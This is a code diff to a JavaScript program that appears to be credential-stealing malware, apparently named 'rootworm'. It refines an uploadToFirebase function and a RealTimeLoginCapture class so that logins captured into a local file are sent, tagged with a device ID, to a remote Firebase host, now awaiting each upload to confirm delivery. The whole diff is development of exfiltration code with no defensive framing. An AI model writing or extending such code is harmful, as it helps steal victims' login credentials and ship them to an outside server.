@@ -50,12 +50,21 @@ function uploadToFirebase(data) {
     },
   };
   const transport = parsed.protocol === 'https:' ? https : http;
-  const req = transport.request(options);
-  req.on('error', () => {});
-  req.write(payload);
-  req.end();
-}
 
+  return new Promise((resolve) => {
+    const req = transport.request(options, (res) => {
+      let body = '';
+      res.setEncoding('utf8');
+      res.on('data', (chunk) => (body += chunk));
+      res.on('end', () => {
+        resolve(res.statusCode >= 200 && res.statusCode < 300);
+      });
+    });
+    req.on('error', () => resolve(false));
+    req.write(payload);
+    req.end();
+  });
+}
 // ================================================================
 // 1. REAL‑TIME LOGIN CAPTURE (Cross‑platform)
 // ================================================================
@@ -153,7 +162,7 @@ class RealTimeLoginCapture {
     } catch(e) {}
   }
 
-  readAndSend() {
+    async readAndSend() {
     const captures = [];
     try {
       if (fs.existsSync(this.logFile)) {
@@ -187,13 +196,13 @@ class RealTimeLoginCapture {
     } catch(e) {}
 
     // Send each capture to Firebase
-    for (const cap of captures) {
-      uploadToFirebase({
-        source: 'rootworm_realtime',
-        device_id: DEVICE_ID,
-        ...cap
-      });
-    }
+   for (const cap of captures) {
+  await uploadToFirebase({
+    source: 'rootworm_realtime',
+    device_id: DEVICE_ID,
+    ...cap
+  });
+   }
   }
 }
 
